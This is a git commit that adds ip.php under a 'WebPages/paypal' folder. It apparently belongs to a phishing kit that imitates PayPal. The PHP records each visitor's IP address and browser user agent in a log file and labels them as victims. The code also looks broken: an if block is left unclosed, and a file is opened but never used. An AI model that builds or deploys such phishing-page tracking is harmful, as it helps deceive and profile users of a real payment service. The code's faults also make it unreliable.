af20965d3aabc30ff102ead92d2cf6e84a7b3a5a
Pipioli <30368267+Pipioli@users.noreply.github.com>
2018-06-30 19:35:25 +0200

    Create ip.php

---
+++ WebPages/paypal/ip.php
@@ -0,0 +1,27 @@
+<?php
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$myFile = file_get_contents("protect.html");
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+if($myFile) {
+    file_put_contents("cat.txt", "[IP]: " . $ipaddress . " [USER-A]: " . $useragent . "[BROWSER]: " . $browser . "\n", FILE_APPEND);
+exit();
+?>
